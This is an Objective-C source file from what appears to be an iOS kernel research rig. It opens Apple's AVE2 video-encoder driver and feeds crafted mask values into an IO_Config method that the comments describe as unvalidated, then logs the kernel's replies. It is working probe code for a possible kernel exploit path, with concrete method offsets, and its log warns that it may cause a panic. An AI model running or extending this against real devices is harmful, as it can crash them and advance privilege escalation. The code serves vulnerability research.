//
//  P144AVE2Config.m — the AVE2 IO_Config MASK INTAKE (row 2). p144.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  The agent-decoded arm on 24A435: sMethods @0x7f902d0, 16 rows
//  stride 0x28 {method, scalarIn@+8, structIn@+0xc, structOut@+0x14};
//  row2 = IO_Config (structIn 0x38 / out 0x20); the mask = the u64 at
//  structIn+0x30 (unvalidated); consumed by the encode-loop map step.
//

#import "P144AVE2Config.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P144_BUILD @"p144-ave2config-v1"

typedef mach_port_t p_ioservice_t; typedef mach_port_t p_ioconnect_t;
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef p_ioservice_t (*GetSVC_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOOpen_t)(p_ioservice_t, mach_port_t, uint32_t, p_ioconnect_t *);
typedef void (*IORel_t)(mach_port_t);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t, const uint64_t *, uint32_t, const void *, size_t,
    uint64_t *, uint32_t *, void *, size_t *);

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P144R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p144_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p144", arms, 1, &sr, 0, "p144 ave2config auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p144", 0, outcome);
}

@implementation P144AVE2Config

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p144_ave2config_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p144 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P144_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[agent-law] AVE2UserClient sMethods @0x7f902d0 (16 rows stride");
    L(@"  0x28 {method, scIn@+8, stIn@+0xc, stOut@+0x14}): row0 IO_Open");
    L(@"  (0x768/0x38), row1 IO_Close (0x28/0x20), **row2 IO_Config");
    L(@"  (0x38/0x20; the u64 @structIn+0x30 = the RAW MASK into");
    L(@"  [session+0x110], unvalidated)**, row3 IO_Prepare (0x12c08!),");
    L(@"  row4 IO_Start (0x12c18/0x150). State-machine: IO_Open first.");
    L(@"  NO entitlement strings in the row region. The mask's consumer");
    L(@"  = the encode-loop map step (chk+the write-through mapper).");
    L(@"[!] PANIC-POSSIBLE (a real state machine); one tap; census rows");
    L(@"  only; a 0-kr = the intake ACCEPTED (state-manipulation class);");
    L(@"  hasKread stays kread32-gated.");

    /* the knob: the masks to try, smallest real shape first */
    const uint64_t masks[3] = { 0x1ull, 0x3ull, 0xfffffffffffffffcull };

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { L(@"[-] STOP dlopen"); p144_bandit("nodlopen"); return P144R(); }
    IOServiceMatching_t pM = dlsym(iokit, "IOServiceMatching");
    GetSVC_t pG = dlsym(iokit, "IOServiceGetMatchingService");
    IOOpen_t pO = dlsym(iokit, "IOServiceOpen");
    IORel_t pR = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t call = dlsym(iokit, "IOConnectCallMethod");
    if (!pM || !pG || !pO || !pR || !call) {
        L(@"[-] STOP dlsym"); p144_bandit("nodlsym"); return P144R();
    }

    /* ---- stage 1: the open census ---- */
    const char *names[2] = { "AppleAVE2Driver", "AppleAVE2" };
    p_ioconnect_t conn = 0;
    for (int i = 0; i < 2; i++) {
        p_ioservice_t svc = pG(0, pM(names[i]));
        if (!svc || svc >= 0xffffff00) { Lf(@"  match '%s' -> NO SERVICE", names[i]); continue; }
        for (uint32_t t = 0; t <= 2; t++) {
            p_ioconnect_t c = 0;
            kern_return_t okr = pO(svc, mach_task_self(), t, &c);
            Lf(@"[$1] %s open t%u kr=0x%08x conn=0x%08x", names[i], t,
               (unsigned)okr, (unsigned)c);
            if (okr == 0 && c) { conn = c; break; }
        }
        pR(svc);
        if (conn) break;
    }
    if (!conn) {
        L(@"[-] no connect (the 2bd/2e2 law = the honest reach row on");
        L(@"    this device — the intake's userland arm = the open path)");
        p144_bandit("noconn"); return P144R();
    }

    /* ---- stage 2: IO_Open first (the state-machine law) ---- */
    {
        uint8_t ob[0x800]; memset(ob, 0, sizeof ob);
        uint64_t out[2]; memset(out, 0, sizeof out);
        uint32_t nout = 2;
        size_t osc = 0x38;
        kern_return_t kr = call(conn, 0, NULL, 0, ob, 0x768, out, &nout,
                                ob, &osc);
        Lf(@"[2] IO_Open kr=0x%08x out=[%llu %llu]", (unsigned)kr,
           (unsigned long long)out[0], (unsigned long long)out[1]);
    }

    /* ---- stage 3: the IO_Config census (the mask rows) ---- */
    for (int mi = 0; mi < 3; mi++) {
        uint8_t cfg[0x38]; memset(cfg, 0, sizeof cfg);
        *(uint64_t *)(cfg + 0x30) = masks[mi];   /* the intake law: +0x30 */
        uint64_t out[4]; memset(out, 0, sizeof out);
        uint32_t nout = 4;
        uint8_t sob[0x20]; memset(sob, 0, sizeof sob);
        size_t osc = sizeof sob;
        kern_return_t kr = call(conn, 2, NULL, 0, cfg, sizeof cfg,
                                out, &nout, sob, &osc);
        Lf(@"[3] IO_Config mask=0x%016llx kr=0x%08x out0=0x%llx",
           (unsigned long long)masks[mi], (unsigned)kr,
           (unsigned long long)out[0]);
    }
    L(@"[3] honest class: a 0-kr row = the mask ACCEPTED (the intake");
    L(@"    landed; the consumption = the next map step); 2c2 = the");
    L(@"    wrong-shape reply; other kr = the state machine's gate row.");

    Lf(@"[end] board: %@", [[P007Board shared] kreadSignal]);
    p144_bandit("ran");
    Lf(@"=== p144 end %@ ===", LabLocalMilitaryNow());
    return P144R();
}

@end